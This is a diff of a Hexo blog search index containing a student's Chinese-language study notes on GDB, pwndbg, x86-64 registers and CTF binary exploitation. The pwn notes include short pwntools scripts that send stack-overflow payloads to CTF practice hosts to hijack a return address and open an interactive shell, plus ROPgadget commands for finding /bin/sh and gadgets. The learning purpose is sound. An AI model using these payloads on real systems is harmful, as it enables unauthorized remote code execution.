@@ -1,21 +1,244 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2024/01/13/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>多查多练不行重来</title>
+    <url>/2024/01/13/Hexo%E8%BF%90%E8%90%A5%E6%8C%87%E5%8D%97/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JAVA的自我修炼</title>
+    <url>/2024/01/13/JAVA%E4%B8%80%E5%AD%A6%E5%88%B0%E5%BA%95/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>程序语言</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux太揪心</title>
+    <url>/2024/01/13/Linux%E4%B8%8D%E5%AD%A6%E4%B8%8D%E8%A1%8C/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Linux系统管理</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwngdb和pwndbg联合使用</title>
+    <url>/2024/01/06/pwngdb%E5%92%8Cpwndbg%E8%81%94%E5%90%88%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>编译程序——启动GDB——运行程序——调试程序</p>
+<p>编译程序</p>
+<p>使用gcc编译C语言程序，并添加-g选项，以生成调试信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -g -o program program.c</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>启动GDB</p>
+<p>在终端中输入以下命令来启动GDB，并将可执行文件作为参数传递给它：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb program</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>运行程序</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>调试程序</p>
+<p>程序开始执行后，你可以使用以下命令进行调试：</p>
+<ul>
+<li>next：执行下一行代码。</li>
+<li>step：进入函数并调试该函数。</li>
+<li>finish：从当前函数返回到调用它的函数，并在那里暂停。</li>
+<li>break：在某个位置上设置断点。</li>
+<li>watch：在某个变量上设置监视点。</li>
+<li>print：打印变量的值。</li>
+</ul>
+<p>退出GDB</p>
+<p>使用quit命令退出GDB：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+
+
+
+<h2 id="栈的开启和销毁、函数的调用理解"><a href="#栈的开启和销毁、函数的调用理解" class="headerlink" title="栈的开启和销毁、函数的调用理解"></a>栈的开启和销毁、函数的调用理解</h2><p>当一个函数被调用时，程序会将当前函数的返回地址、参数和局部变量等信息推入栈中，然后跳转到被调用的函数。被调用的函数使用这些信息执行操作，完了之后再从栈中弹出这些信息，返回到原始的函数。</p>
+<p>以下是一些关于函数调用和栈的开启和销毁的基本概念和操作：</p>
+<ol>
+<li>函数调用</li>
+</ol>
+<p>在C语言中，你可以使用函数名来调用函数。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制代码int result = add(2, 3);</span><br></pre></td></tr></table></figure>
+
+<p>这里我们调用了一个名为add的函数，并传递了两个参数2和3。被调用的函数返回一个值，该值存储在result变量中。</p>
+<p>栈的开启和销毁</p>
+<p>在函数调用过程中，程序需要在堆栈上保留一些信息，包括返回地址、参数和局部变量等。这些信息通常在函数开头时被放入堆栈中，并在函数结束时从堆栈中弹出。这个过程称为栈的开启和销毁。</p>
+<p>在C语言中，你不需要手动开启或销毁堆栈，编译器会自动完成这些工作。它会生成代码，在函数开头向堆栈中推送所需的信息，并在函数结束时从堆栈中弹出这些信息。这个过程是透明的，你只需要调用函数即可。</p>
+<p>递归函数</p>
+<p>递归函数是一种特殊的函数，它在其自身内部调用自己。在递归调用期间，每个函数调用都会将新的信息推入堆栈中，因此堆栈的大小会不断增加。当递归调用结束时，每个函数调用都会从堆栈中弹出信息，因此堆栈的大小会逐渐减小。</p>
+<p>当递归调用过多时，堆栈可能会耗尽，导致堆栈溢出错误。为了避免这种情况，你可以使用尾递归优化或者循环来代替递归。</p>
+<p>总之，函数调用和栈的开启和销毁是C语言中非常基本的概念和操作。在编写C程序时，你需要注意函数调用、堆栈的使用和内存的管理，以避免出现错误和漏洞。</p>
 ]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn学习笔记</title>
+    <url>/2024/01/06/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="基础：-C语言-汇编语言-python，操作系统-Linux系统管理"><a href="#基础：-C语言-汇编语言-python，操作系统-Linux系统管理" class="headerlink" title="基础： C语言  汇编语言   python，操作系统  Linux系统管理"></a>基础： C语言  汇编语言   python，操作系统  Linux系统管理</h2><h2 id="工具：IDApro-GDB-pwntools-pwndbg"><a href="#工具：IDApro-GDB-pwntools-pwndbg" class="headerlink" title="工具：IDApro     GDB    pwntools     pwndbg"></a>工具：IDApro     GDB    pwntools     pwndbg</h2><h1 id="pwn环境的搭建："><a href="#pwn环境的搭建：" class="headerlink" title="pwn环境的搭建："></a>pwn环境的搭建：</h1><h2 id="1-python2-python3代码："><a href="#1-python2-python3代码：" class="headerlink" title="1.python2,python3代码："></a>1.python2,python3代码：</h2><p>sudo apt install python2</p>
+<p>sudo apt install python3-pip</p>
+<h2 id="2-ubuntu怎么切换到root用户，使用su-root命令，去切换到root权限，会提示输入密码，可是如何也输不对，提示“Authentication-failure”或者是提示认证失败。"><a href="#2-ubuntu怎么切换到root用户，使用su-root命令，去切换到root权限，会提示输入密码，可是如何也输不对，提示“Authentication-failure”或者是提示认证失败。" class="headerlink" title="2.ubuntu怎么切换到root用户，使用su root命令，去切换到root权限，会提示输入密码，可是如何也输不对，提示“Authentication failure”或者是提示认证失败。"></a>2.ubuntu怎么切换到root用户，使用su root命令，去切换到root权限，会提示输入密码，可是如何也输不对，提示“Authentication failure”或者是提示认证失败。</h2><p>该错误有两种情况一个是密码错了，另一种就是新安装好的Linux系统，暂时还没有给root设置密码。</p>
+<p>1、打开Ubuntu，输入命令：su root，回车提示输入密码，如何输入都不对。</p>
+<p>2、给root用户设置密码，命令“sudo passwd root ” 。 输入密码，并确认密码。</p>
+<p>3、重新输入命令“su root”   然后输入密码。就可切换到root权限了。</p>
+<h2 id="3-安装vim"><a href="#3-安装vim" class="headerlink" title="3. 安装vim"></a>3. 安装vim</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install vim</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-修改软件源"><a href="#4-修改软件源" class="headerlink" title="4. 修改软件源"></a>4. 修改软件源</h2><p>ubuntu自带的软件源是国外的，速度慢有的时候还连不上，于是应修改为国内的镜像。</p>
+<p><a href="https://blog.csdn.net/qq_43871241/article/details/128935374?ops_request_misc=%7B%22request_id%22:%22170031586316800182128499%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170031586316800182128499&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_click~default-2-128935374-null-null.nonecase&utm_term=ubuntu22.04%E6%8D%A2%E6%BA%90&spm=1018.2226.3001.4450">Ubuntu22.04更换软件源-CSDN博客</a></p>
+<p>修改完文件之后记得<code>apt update</code>和<code>apt upgrade</code>进行更新。</p>
+<p><a href="https://blog.csdn.net/m0_52249553/article/details/130477579?ops_request_misc=%7B%22request_id%22:%22170031475716800215023037%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170031475716800215023037&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-1-130477579-null-null.nonecase&utm_term=ubuntu22.04%E9%85%8D%E7%BD%AEpwn%E7%8E%AF%E5%A2%83&spm=1018.2226.3001.4450">Ubuntu下pwn环境搭建_pwn ubuntu-CSDN博客</a></p>
+<h2 id="主流漏洞："><a href="#主流漏洞：" class="headerlink" title="主流漏洞："></a>主流漏洞：</h2><p>栈溢出   堆溢出    ROP     格式化字符串漏洞      其他漏洞</p>
+<h2 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h2><p>获取题目附件</p>
+<p>将附件复制一份到Linux虚拟机中，使用checksec指令检查程序开启的保护和程序的位数（32位或64位）</p>
+<p>打开题目环境，使用nc指令连接服务器，尝试猜测程序的功能，有时签到题会在你nc上去后，直接提供给你系统权限，此时可直接使用系统指令，寻找flag</p>
+<p>使用对应位数的IDA工具对附件进行反编译，理解并发现其中的漏洞</p>
+<p>分析漏洞，使用python和pwntool库编写攻击脚本playload。</p>
+<p>最后，让你的攻击脚本跑起来，成功拿取权限后，flag即可到手</p>
+<p><strong>首先看到无后缀文件，可以判断应该是Linux EIF文件，用Linux file命令看，发现是64位的文件</strong></p>
+<p><strong>main()函数按F5查看伪代码，发现危险函数gets，可以判断存在栈溢出漏洞</strong></p>
+<p>接着查看fun()函数，发现是system函数，system是c语言下的一个可以执行shell命令的函数</p>
+<p><strong>函数的局部变量会存放在他的栈中，那么在main函数中，我们双击s变量，查看s分配了多少空间</strong></p>
+<p>攻击脚本</p>
+<p>from pwn import *<br>p&#x3D;remote(“node4.buuoj.cn”,29244) &#x2F;&#x2F;靶机地址和端口<br>payload&#x3D;’A’*15+’B’*8+p64(0x401186+1).decode(“iso-8859-1”)<br>&#x2F;&#x2F;char s的15个字节+RBP的8字节+fun函数入口地址，+1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。<br>p.sendline(payload)<br>p.interactive()</p>
+<h2 id="常用指令："><a href="#常用指令：" class="headerlink" title="常用指令："></a>常用指令：</h2><p>学习技巧：</p>
+<p>1.复制主机中的内容，然后在虚拟机终端直接按鼠标滚轮 &#x2F;  右键选择粘贴即可</p>
+<p>在vim 编辑器中快速删除内容， gg +d </p>
+<p> Ctrl +Z   退出</p>
+<p>nc的全名是<a href="https://so.csdn.net/so/search?q=netcat&spm=1001.2101.3001.7020">netcat</a>，其主要用途是建立和监听任意TCP和UDP连接，支持ipv4和ipv6。因此，它可以用来网络调试、端口扫描等等（nc [-hlnruz][-g&lt;网关…&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v…][-w&lt;超时秒数&gt;][主机名称][通信端口…]）</p>
+<p>fun函数里面发现了system函数，system是c语言下的一个可以执行shell命令的函数，目前你可以简单理解为，执行了这个危险函数，我们就拿到了远端服务器的shell，也就是相当于在windows下以管理员身份开启cmd，那么我们就可以通过一系列后续指令控制远端服务器。</p>
+<p>+1是为了堆栈平衡</p>
+<p>from pwn import *</p>
+<p>p &#x3D; remote(‘node4.buuoj.cn’, 27451)</p>
+<p>使用python3 xx.py 运行攻击脚本</p>
+<p><strong>checksec 查看保护程序</strong></p>
+<p><strong>file查看文件</strong></p>
+<h2 id="linux系统管理"><a href="#linux系统管理" class="headerlink" title="linux系统管理"></a>linux系统管理</h2><p>file 文件  &#x2F;&#x2F;查看文件类型<br>checksec 文件  &#x2F;&#x2F;查看文件保护<br>echo ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo&#x3D; | base64 -d       &#x2F;&#x2F;Linux自带Base64解码工具<br>chmod 777 文件名   &#x2F;&#x2F;给文件加可执行权限</p>
+<h2 id="IDApro"><a href="#IDApro" class="headerlink" title="IDApro"></a>IDApro</h2><p>快捷键<br>Tab     切换<br>空格    看IDA地址<br>N       改函数名字<br>&#x2F;       进行备注<br>F5      看伪代码<br>shift+F12     看字符串<br>Esc           返回上一步<br>ctrl+x        查看一下哪里调用了这个字符串<br>g             输入地址，可以跳转到地址位置</p>
+<h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>gdb        &#x2F;&#x2F;执行文件<br>b main     &#x2F;&#x2F;动态调试main函数，或者某个地址<br>r          &#x2F;&#x2F;跑起来<br>ni        &#x2F;&#x2F;一步一步调试这个函数<br>n         &#x2F;&#x2F;执行<br>si        &#x2F;&#x2F;进入这个函数<br>cyclic -l ad   &#x2F;&#x2F;计算值ad之前的字符串长度<br>cyclic 200    &#x2F;&#x2F;生成200个垃圾字符<br>plt           &#x2F;&#x2F;查看调用哪些的函数<br>got           &#x2F;&#x2F;查看调用函数的具体地址<br>return         &#x2F;&#x2F;从子函数返回<br>x&#x2F;20gx 0x45622       &#x2F;&#x2F;查看地址的机械码<br>disass 0x7fff7e65       &#x2F;&#x2F;反汇编<br>backtrace            &#x2F;&#x2F;显示整个函数调用的栈情况</p>
+<p>gdb + 程序   → b main  → R  运行  </p>
+<p>GDB调试结果各部分</p>
+<p>————————————————————[REGISTERS]————————————————————————</p>
+<p>寄存器（Registers）是位于CPU内部的一组高速存储器单元。寄存器用于存储和处理指令执行过程中的数据、地址和控制信息。</p>
+<p>───────────────────────────——─[DISASM]─——————────────────────────────────</p>
+<p>DISASM是指反汇编（Disassembly）的过程，它将机器码（二进制代码）转换回可读的汇编语言表示形式。反汇编器（Disassembler）是执行这一过程的工具或程序。</p>
+<p>——————————————————————SOURCE (CODE)——————————————————————-</p>
+<p>源代码（Source code）是计算机程序的人类可读形式，通常使用文字编写的一系列指令和声明。它是软件开发过程中的重要组成部分，用于描述程序的逻辑、功能和行为。</p>
+<p>——————————————————————STACK———————————————————————————— </p>
+<p>栈（Stack）是一种数据结构，它具有<strong>后进先出</strong>（Last In First Out，简称LIFO）的特性，也就是最后进入的元素首先被取出。</p>
+<p>在计算机科学中，栈通常用于存储临时数据和函数调用信息。当一个函数被调用时，它的参数和返回地址等信息会被压入栈中，当函数执行完毕后，这些信息会被弹出栈。</p>
+<p>栈有两个基本操作：压入（Push）和弹出（Pop）。当新元素被压入栈时，它被放置在栈顶；当元素被弹出栈时，它被移除并返回到调用者。栈还支持访问栈顶元素的操作，但不允许在非栈顶位置插入或删除元素。</p>
+<p>————————————————————BACKTRACE———————————————————————————</p>
+<p>回溯（Backtrace）是一种递归的算法，通过尝试不同的选择来解决问题。回溯算法通常用于在搜索空间中找到所有或特定数量的解。</p>
+<p>回溯算法的基本思想是：从问题的初始状态开始，通过尝试每个可能的选择，逐步地向解决方案前进。如果某个选择不能够得到解决方案，就会返回到上一个状态并尝试其他选择。这个过程会一直重复，直到找到解决方案或者无法再尝试任何选择为止。</p>
+<p>回溯算法通常用递归函数来实现。在递归调用中，程序会先尝试一个选择，然后递归调用自身来处理子问题。如果子问题能够得到解决方案，就会返回真值；否则，程序会撤销当前选择，并尝试其他选择。当所有选择都尝试完毕后，如果依然没有找到解决方案，就返回假值。</p>
+<p>在 GDB 中进行调试通常遵循以下一般流程：</p>
+<ol>
+<li><p><strong>编译程序时启用调试信息</strong>：在使用 GCC 或其他编译器编译程序时，需要添加 <code>-g</code> 选项以包含调试信息。例如：</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">复制代码gcc -g -o program program.c</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>启动 GDB</strong>：在命令行中输入 <code>gdb program</code> 来启动 GDB 并加载要调试的程序。</p>
+</li>
+<li><p><strong>设置断点</strong>：通过在感兴趣的位置设置断点，可以指示 GDB 在执行到该位置时停下来。可以使用 <code>break</code> 命令设置断点，例如：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">复制代码<span class="keyword">break</span> main</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>运行程序</strong>：输入 <code>run</code> 命令来运行程序，直到遇到设置的断点或程序结束。</p>
+</li>
+<li><p><strong>逐步执行程序</strong>：一旦程序停在断点处，可以使用 <code>step</code> 命令逐步执行程序，逐行查看程序的执行过程，并检查变量的值和程序状态。</p>
+</li>
+<li><p><strong>观察变量和内存</strong>：使用 <code>print</code> 命令来查看变量的值，使用 <code>display</code> 命令设置要自动显示的表达式，使用 <code>x</code> 命令查看内存中的内容。</p>
+</li>
+<li><p><strong>继续执行</strong>：使用 <code>continue</code> 命令让程序继续执行，直到再次遇到断点或程序结束。</p>
+</li>
+<li><p><strong>跟踪函数调用</strong>：使用 <code>step</code> 命令进入函数内部进行单步执行，或使用 <code>next</code> 命令跳过函数内部的单步执行。</p>
+</li>
+<li><p><strong>处理异常情况</strong>：如果程序出现异常，如段错误或断言失败，GDB 会停止程序并显示相关的调试信息，帮助你定位问题所在。</p>
+</li>
+<li><p><strong>退出 GDB</strong>：当调试结束时，可以输入 <code>quit</code> 命令退出 GDB。</p>
+</li>
+</ol>
+<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>python3<br>from pwn import *<br>io &#x3D; remote(“122.54.129.202”,端口)#建立连接<br>io.rercv() #接收信息<br>&#x2F;&#x2F;本地：<br>python3<br>from pwn import *<br>io &#x3D; process(“.&#x2F;level0”)<br>gdb.attach(io,’b *0x080485c5’)   &#x2F;&#x2F;设置断点去调式攻击代码<br>io.recvline()<br>payload &#x3D; b’a’*16 + p64(0x6532387)<br>io.sendline(payload)  &#x2F;&#x2F;传送信息过去<br>io.interactive()  &#x2F;&#x2F;交互</p>
+<h2 id="elf"><a href="#elf" class="headerlink" title="elf"></a>elf</h2><p>elf &#x3D; ELF(“.&#x2F;ret2syscall”)<br>system_plt &#x3D; elf.plt[“system”]       &#x2F;&#x2F;查找system的地址<br>binsh &#x3D; hex(next(elf.search(b”&#x2F;bin&#x2F;sh”)))   #pwntools自动找&#x2F;bin&#x2F;sh地址</p>
+<h2 id="ROPgadget用法"><a href="#ROPgadget用法" class="headerlink" title="ROPgadget用法"></a>ROPgadget用法</h2><p>ROPgadget –binary 文件名 –only “pop|ret”  &#x2F;&#x2F;文件中的查找gadgets<br>ROPgadget –binary .&#x2F;7.exe –only “pop|ret” | grep “eax”    &#x2F;&#x2F;从pop、ret序列当中寻找其中的eax</p>
+<p>ROPgadget –binary .&#x2F;7.exe –only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”      &#x2F;&#x2F; 从pop、ret序列当中寻找其中的ebx、ecx、dex</p>
+<p>ROPgadget –binary .&#x2F;7.exe –string “&#x2F;bin&#x2F;sh”           &#x2F;&#x2F;找”&#x2F;bin&#x2F;sh”这个字符串的地址</p>
+<p>ROPgadget –binary .&#x2F;7.exe –only “int”|grep “0x80”        &#x2F;&#x2F;int中断找”0x80”</p>
+<h1 id="接收远程主机发送的内容"><a href="#接收远程主机发送的内容" class="headerlink" title="接收远程主机发送的内容"></a>接收远程主机发送的内容</h1><p>print(p.recv())</p>
+<p>payload &#x3D; ‘a’ * 0x2c + p64(0x400734)</p>
+<h1 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h1><p>p.sendline(payload)</p>
+<h1 id="进入交互模式"><a href="#进入交互模式" class="headerlink" title="进入交互模式"></a>进入交互模式</h1><p>p.interactive()</p>
+<p>看起来你可能遇到了一个命名冲突的问题。根据你的错误信息，似乎你的脚本文件名也叫做”<a href="http://pwn.py/">pwn.py</a>“，这与Pwntools库中的模块名相同，导致了命名冲突。</p>
+<p>为了解决这个问题，最简单的方法是将你的脚本文件重命名为与Pwntools库中的模块名不冲突的名字，比如”<a href="http://exploit.py/">exploit.py</a>“或者其他名字。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SyntaxError: Non-ASCII character <span class="string">&#x27;\xe6&#x27;</span> <span class="keyword">in</span> file exploit.py on line <span class="number">4</span>, but no encoding declared; see http://python.org/dev/peps/pep-0263/ <span class="keyword">for</span> details</span><br></pre></td></tr></table></figure>
+
+<p>这个错误表明你的Python脚本包含了非ASCII字符，但是没有指定编码方式。在Python中，如果脚本中包含非ASCII字符，需要在脚本开头进行声明编码方式。</p>
+<p>你可以在脚本的开头添加以下注释来声明编码方式：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="11-13"><a href="#11-13" class="headerlink" title="11.13"></a>11.13</h2><p>在使用checksec工具检查程序时，当发现”Canary found”的提示时，意味着程序启用了堆栈保护机制（Stack Canary）。这个提示表明程序在编译时使用了栈保护来防止缓冲区溢出攻击。</p>
+<p>堆栈保护（Stack Canary）是一种安全措施，它通过在函数返回地址之前插入一个随机值（被称为”canary”），并在函数返回前检查这个值是否被修改，从而防止攻击者利用缓冲区溢出来修改函数返回地址。因此，当你在虚拟机中使用checksec工具，发现”Canary found”的提示时，表明程序已经开启了这项重要的安全保护措施。</p>
+<p>%d - 十进制 - 打印十进制整数<br>%s - 字符串 - 打印参数地址处的字符串<br>%x,%X- 十六进制 - 打印十六进制数<br>%o - 八进制 -打印八进制整形<br>%c - 字符 - 打印字符<br>%p - 指针 - 打印指针地址 即void *<br>%n - 到目前为止所写的字符数</p>
+<p>危险函数：  存在 gets(); 存在栈溢出**</p>
+<p>​                 reads </p>
+<p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20231113200232101.png" alt="image-20231113200232101" loading="lazy"></p>
+<h2 id="11-16"><a href="#11-16" class="headerlink" title="11.16"></a>11.16</h2><p><code>gets()</code>函数存在缓冲区溢出的风险，因为它无法限制输入字符的数量，这使得攻击者可以输入超出<code>char s[15]</code>缓冲区大小的数据，从而覆盖其他重要的数据。攻击者可以通过输入超出15个字符的数据来改变程序的行为，甚至执行恶意代码。这种类型的漏洞很容易导致被攻击者利用，例如进行拒绝服务攻击、执行任意代码等恶意行为。</p>
+<p>要修复这个问题，应该避免使用<code>gets()</code>函数，而是使用更安全的输入函数，比如<code>fgets()</code>，并且在读取输入时要确保不会超出目标缓冲区的大小。同时，对用户输入进行验证和过滤也是非常重要的，以防止恶意输入。</p>
+<p>可以使用&#96;chmod +x &#x2F;可执行文件  来添加可执行权限。</p>
+<h2 id="12-20"><a href="#12-20" class="headerlink" title="12.20"></a>12.20</h2><p>rbp在64位里是8字节</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>每个人都是一座孤岛</title>
+    <url>/2024/01/13/%E5%AD%A4%E5%B2%9B%E6%97%A5%E8%AE%B0/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>随心</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>汇编语言初识笔记</title>
+    <url>/2024/01/06/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%88%9D%E8%AF%86%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>在x86-64架构的CPU中，rdi、rsi和rdx是通用寄存器，它们在函数调用和系统调用中扮演重要角色。</p>
+<p>在Linux 64位系统中，函数参数通常通过寄存器传递，其中rdi、rsi、rdx、rcx、r8 和 r9 分别用于传递前6个整型参数。而在这些寄存器中，rdi 通常用于存储第一个参数，rsi 用于存储第二个参数，rdx 用于存储第三个参数。</p>
+<p>举个例子，如果你在汇编中调用一个C语言函数，你可能会看到类似下面的代码：</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">复制代码mov rdi, <span class="number">10</span>    ; 将<span class="number">10</span>赋值给rdi，作为第一个参数</span><br><span class="line">mov rsi, <span class="number">20</span>    ; 将<span class="number">20</span>赋值给rsi，作为第二个参数</span><br><span class="line">mov rdx, <span class="number">30</span>    ; 将<span class="number">30</span>赋值给rdx，作为第三个参数</span><br><span class="line">call some_function  ; 调用函数</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，rdi 存储第一个参数 10，rsi 存储第二个参数 20，rdx 存储第三个参数 30。当函数 some_function 被调用时，这些寄存器中的值将作为函数的参数传递进去。</p>
+<p>总之，rdi、rsi 和 rdx 在函数调用和系统调用中通常用来传递参数，它们在调用过程中承担着非常重要的角色。</p>
+]]></content>
+      <categories>
+        <category>程序语言</category>
+      </categories>
+      <tags>
+        <tag>汇编语言</tag>
+      </tags>
   </entry>
 </search>
